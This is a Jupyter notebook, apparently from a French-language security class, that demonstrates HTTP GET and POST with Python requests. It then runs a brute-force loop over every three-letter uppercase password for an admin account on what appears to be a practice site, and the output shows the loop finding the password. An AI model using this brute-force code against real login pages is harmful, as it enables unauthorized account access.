{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Requests: requetes HTTP GET et POST\n",
    "\n",
    "## Requete GET\n",
    "\n",
    "Pour lire le contenu d'une page web"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "x = requests.get(\"http://flop-security.mips.science/index.php\")\n",
    "\n",
    "print(\"Code HTTP:\", x.status_code)\n",
    "print(x.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Requete POST\n",
    "\n",
    "Pour envoyer des informations à un formulaire"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "401\n",
      "200\n"
     ]
    }
   ],
   "source": [
    "url = 'http://top-security.mips.science/index.php'\n",
    "\n",
    "auth = {'email': \"admin@example.com\", 'password' : \"CSH\" }\n",
    "x = requests.post(url, data = auth)\n",
    "print(x.status_code)\n",
    "\n",
    "auth = {'email': \"admin@example.com\", 'password' : \"AWK\" }\n",
    "x = requests.post(url, data = auth)\n",
    "print(x.status_code)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "admin@example.com\n",
      "200\n"
     ]
    }
   ],
   "source": [
    "auth(email,'AWK')\n",
    "print(email)\n",
    "\n",
    "url = 'http://top-security.mips.science/index.php'\n",
    "auth = {'email': \"admin@example.com\", 'password' : \"AWK\" }\n",
    "\n",
    "x = requests.post(url, data = auth)\n",
    "print(x.status_code)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Brute force\n",
    "\n",
    "delai de 0.2s entre chaque requete"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "A B X\n",
      "A D V\n",
      "A F T\n",
      "A H R\n",
      "A J P\n",
      "A L N\n",
      "A N L\n",
      "A P J\n",
      "A R H\n",
      "A T F\n",
      "A V D\n",
      "Sesame: AWK\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import string\n",
    "import time\n",
    "\n",
    "def auth( email, password ):\n",
    "    url = 'http://top-security.mips.science/index.php'\n",
    "    auth = {'email': email, 'password' : password }\n",
    "\n",
    "    x = requests.post(url, data = auth)\n",
    "    if x.status_code == 200:\n",
    "        auth = True\n",
    "    else:\n",
    "        auth = False\n",
    "        \n",
    "    return(auth)\n",
    "\n",
    "email = \"admin@example.com\"\n",
    "alphabet = string.ascii_uppercase\n",
    "cnt = 0\n",
    "trouve = False\n",
    "for lettre1 in alphabet:\n",
    "    if trouve:\n",
    "        break\n",
    "    for lettre2 in alphabet:\n",
    "        if trouve:\n",
    "            break\n",
    "        for lettre3 in alphabet:\n",
    "            if trouve:\n",
    "                break\n",
    "            sesame = lettre1+lettre2+lettre3\n",
    "            time.sleep(0.2)\n",
    "            if auth( email, sesame ):\n",
    "                trouve = True\n",
    "            else:\n",
    "                cnt += 1\n",
    "                if cnt % 50 == 0:\n",
    "                    print(lettre1, lettre2, lettre3)\n",
    "print(\"Sesame:\", sesame)                "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
